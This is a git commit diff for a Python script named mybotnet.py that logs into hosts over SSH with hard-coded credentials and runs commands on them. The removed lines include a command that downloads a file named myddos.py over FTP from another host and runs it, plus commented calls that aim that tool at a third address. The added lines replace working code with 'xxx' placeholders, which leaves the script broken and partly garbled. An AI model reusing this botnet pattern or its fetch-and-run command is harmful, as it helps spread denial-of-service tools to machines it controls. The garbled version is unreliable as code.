7f06313850169f299dfec844bd8e5bfe3145d14d
追逐繁星的苍岚 <71004114+creategithubcc@users.noreply.github.com>
2021-12-11 17:10:18 +0800

    Update mybotnet.py

--- mybotnet.py
+++ mybotnet.py
@@ -11,26 +11,18 @@ def sshclient(host,user,passw, cmd):
         print("连接出现错误！")
         sys.exit()
 
-    stdin,stdout,stderr=s.exec_command(cmd)
+    xxx,sxxxt,sxxxxr=s.xxxc_xxxxxx(cmd)
     result=stdout.read()
     print(str(result,encoding='utf-8'))
     s.close()
 
 if __name__=='__main__':
     mysql={
-        "192.168.95.129":{
-            "user":"linuxcc",
-            "passw":"linuxcc",
-            "cmd":"wget ftp://192.168.95.128/myddos.py -o myddos1.py\npython3 myddos.py"
-        }#,
-        #"192.168.95.129": {
-        #   "user": "linuxcc",
-        #    "passw": "linuxcc",
-        #    "cmd": ""
-        #},
+        xxxxxxxxxx
+        xxxxxxxxxxxx
+        xxxxxxxxxx
+        xxxxxxxxxxx
     }
-    #botnet_command('wget ftp://192.168.95.128/myddos.py -o myddos.py')
-    #botnet_command('python3 myddos.py 192.168.95.132 21 abc 100')
     for ip_key,v in mysql.items():
-        sshclient(host=ip_key, user=v.get("user"), passw=v.get("passw"), cmd=v.get("cmd"))
+        xxxxxxx(host=ip_key, user=v.get("user"), passw=v.get("passw"), cmd=v.get("cmd"))
     print("ok")
